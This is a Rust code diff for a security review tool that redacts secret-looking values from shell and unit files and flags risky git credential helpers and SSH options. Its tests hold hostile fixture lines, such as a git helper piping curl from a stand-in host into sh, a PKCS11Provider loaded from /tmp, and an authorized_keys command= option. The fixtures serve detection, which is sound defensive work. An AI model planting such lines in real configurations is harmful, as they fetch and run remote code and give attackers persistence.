@@ -6,6 +6,7 @@
 use std::fmt::Write as _;
 
 use super::collect::{Body, Collection, Item};
+use super::commands;
 use super::tier::Tier;
 use crate::autorun::Category;
 use crate::engine::baseline::{Identity, Unit};
@@ -60,7 +61,10 @@ pub fn judge(collection: &Collection, home: Option<&str>, context: &ReviewContex
             }
             Body::Text(text) => {
                 let before = report.findings.len();
-                review::analyze_text(&mut report, &label, text, false);
+                // Reviewed, and sent to the AI, without the values that
+                // look like secrets.
+                let text = without_secrets(text);
+                review::analyze_text(&mut report, &label, &text, false);
                 // Every item is persistence already; naming another start-up
                 // file (`.bash_profile` sourcing `.bashrc`) is not news.
                 drop_rule(&mut report, before, RuleId::PersistenceModification);
@@ -123,12 +127,155 @@ fn drop_rule(report: &mut Report, from: usize, rule: RuleId) {
     });
 }
 
+/// Names that hold a secret: an assignment to one has its value taken out
+/// before the file is reviewed.
+const SECRET_NAMES: &[&str] = &[
+    "KEY",
+    "APIKEY",
+    "TOKEN",
+    "SECRET",
+    "PASSWORD",
+    "PASSWD",
+    "PASSPHRASE",
+    "CREDENTIAL",
+    "CREDENTIALS",
+    "AUTH",
+    "AUTHTOKEN",
+    "PAT",
+];
+
+/// Directories nothing lasting runs from.
+const TEMPORARY: &[&str] = &[
+    "/tmp/",
+    "/var/tmp/",
+    "/dev/shm/",
+    "/run/user/",
+    "/run/media/",
+    "/.cache/",
+];
+
+/// What stands where a value was taken out.
+const REDACTED: &str = "<redacted-by-guardian>";
+
+/// `text` with the values of assignments that look like secrets
+/// (`export API_KEY=…`, `Environment=TOKEN=…`, fish's `set -gx TOKEN …`)
+/// taken out. Shell start-up files, `environment.d` and units are where
+/// exported keys live, and the sweep sends what it reviews to the AI
+/// provider on a timer. Only a plain literal is taken out: a value that is
+/// computed (`$(…)`, a variable, a path) is code or configuration to
+/// review, and holds no secret itself.
+fn without_secrets(text: &str) -> String {
+    text.split_inclusive('\n')
+        .map(|line| redact_line(line).unwrap_or_else(|| line.to_string()))
+        .collect()
+}
+
+fn redact_line(line: &str) -> Option<String> {
+    // fish: `set [-flags] NAME value`.
+    let words: Vec<&str> = line.split_whitespace().collect();
+    if words.first() == Some(&"set")
+        && let Some(name_at) = words.iter().skip(1).position(|word| !word.starts_with('-'))
+        && let (Some(name), Some(value)) = (words.get(name_at + 1), words.get(name_at + 2))
+        && is_secret_name(name)
+        && is_literal_secret(value.trim_matches(['"', '\'']))
+        && words.len() == name_at + 3
+    {
+        return Some(line.replacen(value, REDACTED, 1));
+    }
+    let mut out = String::new();
+    let mut rest = line;
+    let mut changed = false;
+    while let Some(at) = rest.find('=') {
+        let (before, after) = rest.split_at(at);
+        // Blanks around the `=` (`password = "…"` in a configuration
+        // file) are kept as they are.
+        let blanks = after[1..].len() - after[1..].trim_start_matches([' ', '\t']).len();
+        let (padding, after) = after[1..].split_at(blanks);
+        // The name is the run of name characters before the `=` (all one
+        // byte each, so the cut is on a character boundary).
+        let named = before.trim_end_matches([' ', '\t']);
+        let name_start = named.len()
+            - named
+                .bytes()
+                .rev()
+                .take_while(|byte| byte.is_ascii_alphanumeric() || *byte == b'_')
+                .count();
+        let name = &named[name_start..];
+        let (value, quote) = match after.chars().next() {
+            Some(quote @ ('"' | '\'')) => (
+                after[1..].split(quote).next().unwrap_or_default(),
+                Some(quote),
+            ),
+            // An unquoted value may end the quotes of what it sits in
+            // (`Environment="TOKEN=value"`).
+            _ => (
+                after
+                    .split(|c: char| c.is_whitespace() || c == ';')
+                    .next()
+                    .unwrap_or_default()
+                    .trim_end_matches(['"', '\'']),
+                None,
+            ),
+        };
+        out.push_str(before);
+        out.push('=');
+        out.push_str(padding);
+        let closed = quote.is_none_or(|quote| after[1..].contains(quote));
+        if is_secret_name(name) && is_literal_secret(value) && closed {
+            changed = true;
+            if let Some(quote) = quote {
+                out.push(quote);
+                out.push_str(REDACTED);
+                out.push(quote);
+                rest = &after[value.len() + 2..];
+            } else {
+                out.push_str(REDACTED);
+                rest = &after[value.len()..];
+            }
+        } else {
+            rest = after;
+        }
+    }
+    out.push_str(rest);
+    changed.then_some(out)
+}
+
+/// Whether a part of `name` (between `_`) is one of `SECRET_NAMES`:
+/// `OPENAI_API_KEY` and `DB_PASSWORD` are, `AuthorizedKeysCommand` and
+/// `KEYMAP` are not.
+fn is_secret_name(name: &str) -> bool {
+    name.to_ascii_uppercase()
+        .split('_')
+        .any(|part| SECRET_NAMES.contains(&part))
+}
+
+/// Whether `value` is a literal long enough to be a secret: no expansion,
+/// no command, and nothing that says where something is (a path, a URL,
+/// a relative file): those are what a review needs to see.
+fn is_literal_secret(value: &str) -> bool {
+    value.len() >= 8
+        && !value.starts_with(['/', '~', '$', '-', '.'])
+        && !value.contains("://")
+        && value
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "_-./+=:@%,".contains(c))
+}
+
 fn local_checks(report: &mut Report, item: &Item, label: &str, text: &str) {
     if item.category == Category::Git {
-        // Credential helpers are expected in the user's own configuration;
-        // keys that run on every git command are not.
+        // Credential helpers are expected in the user's own configuration
+        // (`!gh auth git-credential` too, wherever `gh` was installed),
+        // unless one is a shell line of its own or runs a program from a
+        // temporary or cache directory; keys that run on every git command
+        // are not.
         for (line, excerpt) in git_state::executing_keys(text) {
-            if !excerpt.starts_with("credential.") {
+            let helper = excerpt.starts_with("credential.");
+            let odd = excerpt.split_once(" = ").is_some_and(|(_, value)| {
+                let value = value.trim_matches('"');
+                value.contains(['|', ';', '&', '$', '`', '>', '<'])
+                    || TEMPORARY.iter().any(|temporary| value.contains(temporary))
+            });
+            if !helper || odd {
                 report
                     .findings
                     .push(finding(label, line, RuleId::GitConfigCommand, &excerpt));
@@ -145,30 +292,57 @@ fn local_checks(report: &mut Report, item: &Item, label: &str, text: &str) {
     }
     for (index, line) in text.lines().enumerate() {
         let line = line.trim();
-        let runs = if name == "authorized_keys" {
-            // Options come before the key type.
-            let options = line.split_whitespace().next().unwrap_or_default();
-            options.contains("command=") || options.contains("environment=")
+        if line.starts_with('#') {
+            continue;
+        }
+        // Key material is never shown: only the keyword.
+        let excerpt = if name == "authorized_keys" {
+            key_options(line)
+                .filter(|options| {
+                    let options = options.to_ascii_lowercase();
+                    options.contains("command=") || options.contains("environment=")
+                })
+                .map(|_| "command= or environment= option".to_string())
         } else {
-            !item.runs.is_empty()
-                && ["proxycommand", "localcommand", "knownhostscommand"]
-                    .iter()
-                    .any(|key| line.to_ascii_lowercase().starts_with(key))
+            // An included file is followed and checked as its own item;
+            // one in a temporary directory is said here too.
+            commands::ssh(line)
+                .filter(|(key, value)| {
+                    key != "include" || TEMPORARY.iter().any(|temporary| value.contains(temporary))
+                })
+                .map(|(key, _)| key)
         };
-        if runs {
-            // Key material is never shown.
-            let excerpt: String = line
-                .split_whitespace()
-                .next()
-                .unwrap_or_default()
-                .chars()
-                .take(80)
-                .collect();
+        if let Some(excerpt) = excerpt {
             report
                 .findings
                 .push(finding(label, index + 1, RuleId::SshCommand, &excerpt));
         }
     }
+}
+
+/// The options of an `authorized_keys` line: everything before the key
+/// type, where a quoted option value may hold blanks (`from="a b"`).
+fn key_options(line: &str) -> Option<&str> {
+    let mut quoted = false;
+    let mut start = 0;
+    for (index, character) in line.char_indices() {
+        match character {
+            '"' => quoted = !quoted,
+            ' ' | '\t' if !quoted => {
+                if is_key_type(&line[start..index]) {
+                    return (start > 0).then(|| &line[..start]);
+                }
+                start = index + 1;
+            }
+            _ => {}
+        }
+    }
+    // No key type found after options: the whole line is odd; show it.
+    (!is_key_type(&line[start..]) && !line.is_empty()).then_some(line)
+}
+
+fn is_key_type(word: &str) -> bool {
+    word.starts_with("ssh-") || word.starts_with("ecdsa-") || word.starts_with("sk-")
 }
 
 fn finding(path: &str, line: usize, rule: RuleId, excerpt: &str) -> LocalFinding {
@@ -303,11 +477,100 @@ mod tests {
             &mut report,
             &git,
             "~/.gitconfig",
-            "[credential \"https://github.com\"]\n\thelper =\n\thelper = !gh auth git-credential\n[core]\n\tfsmonitor = sh x\n",
+            "[credential \"https://github.com\"]\n\thelper =\n\thelper = !gh auth git-credential\n[core]\n\tfsmonitor = sh x\n[credential]\n\thelper = !curl https://x.example/h | sh\n\thelper = /tmp/helper\n\thelper = store\n\thelper = !/home/u/.local/share/mise/installs/gh/bin/gh auth git-credential\n",
         );
-        assert_eq!(report.findings.len(), 1);
+        // The usual helpers pass; a shell line or a program from a
+        // temporary directory does not.
+        let lines: Vec<usize> = report.findings.iter().map(|finding| finding.line).collect();
+        assert_eq!(lines, [5, 7, 8], "{:?}", report.findings);
         assert_eq!(report.findings[0].rule, RuleId::GitConfigCommand);
-        assert_eq!(report.findings[0].line, 5);
+
+        // SSH: the forms that run or load something, with `=` or blanks,
+        // and an Include from outside the SSH directories.
+        let config = item("home/u/.ssh/config", Category::Ssh, Tier::Unknown);
+        let mut report = Report::new("t");
+        local_checks(
+            &mut report,
+            &config,
+            "~/.ssh/config",
+            "Host x\n  ProxyCommand=/tmp/x %h\n  ProxyJump bastion\nMatch host y exec \"/tmp/y %h\"\n  PKCS11Provider /tmp/evil.so\nInclude ~/.ssh/config.d/*\nInclude /tmp/evil\n# ProxyCommand /tmp/no\n  ProxyCommand none\nInclude ~/.orbstack/ssh/config\nSubsystem sftp internal-sftp\n",
+        );
+        let found: Vec<(usize, &str)> = report
+            .findings
+            .iter()
+            .map(|finding| (finding.line, finding.excerpt.as_str()))
+            .collect();
+        assert_eq!(
+            found,
+            [
+                (2, "proxycommand"),
+                (4, "match"),
+                (5, "pkcs11provider"),
+                (7, "include")
+            ]
+        );
+
+        // An option after one whose value holds a blank is still seen.
+        let mut report = Report::new("t");
+        local_checks(
+            &mut report,
+            &keys,
+            "~/.ssh/authorized_keys",
+            "from=\"a b\",command=\"/tmp/x\" ssh-ed25519 AAAAsecret evil\nfrom=\"10.0.0.0/8\" ssh-ed25519 AAAAok me\n",
+        );
+        let lines: Vec<usize> = report.findings.iter().map(|finding| finding.line).collect();
+        assert_eq!(lines, [1]);
+        assert!(!report.findings[0].excerpt.contains("AAAA"));
+    }
+
+    #[test]
+    fn values_that_look_like_secrets_are_taken_out_before_review() {
+        use super::without_secrets;
+        // A character of more than one byte before an `=` is no trouble.
+        assert_eq!(
+            without_secrets("# café=1\nDescription=Café=x\n"),
+            "# café=1\nDescription=Café=x\n"
+        );
+        let unit = without_secrets(
+            "Environment=\"API_TOKEN=abcdefgh1234\"\nEnvironment='DB_PASSWORD=hunter2hunter2' X=1\n",
+        );
+        assert!(
+            !unit.contains("abcdefgh1234") && !unit.contains("hunter2"),
+            "{unit}"
+        );
+        assert!(
+            unit.contains("Environment=\"API_TOKEN=<redacted-by-guardian>\""),
+            "{unit}"
+        );
+        // What says where something is stays to be read, and a name that
+        // only contains a secret word is no secret's.
+        let spaced = without_secrets("password = \"hunter2hunter2\"\nGH_PAT = ghp_0123456789\n");
+        assert_eq!(
+            spaced,
+            "password = \"<redacted-by-guardian>\"\nGH_PAT = <redacted-by-guardian>\n"
+        );
+        let kept = "AUTH_URL=https://evil.example/p.sh\nRUN_KEY=./payload.sh\nAuthorizedKeysCommand=helper-binary\nAuthorizedKeysFile=.ssh/authorized_keys2\nKEYMAP=us-international\n";
+        assert_eq!(without_secrets(kept), kept);
+        let text = "export PATH=\"$HOME/bin:$PATH\"\nexport OPENAI_API_KEY=sk-abc123def456ghi789\nGITHUB_TOKEN='ghp_0123456789abcdef'; export GITHUB_TOKEN\nEnvironment=DB_PASSWORD=hunter2hunter2 OTHER=1\nset -gx ANTHROPIC_API_KEY sk-ant-0123456789\nexport SSH_AUTH_SOCK=/run/user/1000/ssh\nexport TOKEN=$(curl -s https://x.example/t)\nexport KEYMAP=us\nalias k=kubectl\n";
+        let out = without_secrets(text);
+        for secret in ["sk-abc123", "ghp_0123", "hunter2", "sk-ant-"] {
+            assert!(!out.contains(secret), "{out}");
+        }
+        // What is computed, a path, short or no secret stays to be read.
+        for kept in [
+            "export PATH=\"$HOME/bin:$PATH\"",
+            "OPENAI_API_KEY=<redacted-by-guardian>",
+            "GITHUB_TOKEN='<redacted-by-guardian>'; export GITHUB_TOKEN",
+            "DB_PASSWORD=<redacted-by-guardian> OTHER=1",
+            "set -gx ANTHROPIC_API_KEY <redacted-by-guardian>",
+            "SSH_AUTH_SOCK=/run/user/1000/ssh",
+            "TOKEN=$(curl -s https://x.example/t)",
+            "KEYMAP=us",
+            "alias k=kubectl",
+        ] {
+            assert!(out.contains(kept), "{kept}\n{out}");
+        }
+        assert_eq!(out.lines().count(), text.lines().count());
     }
 
     #[test]
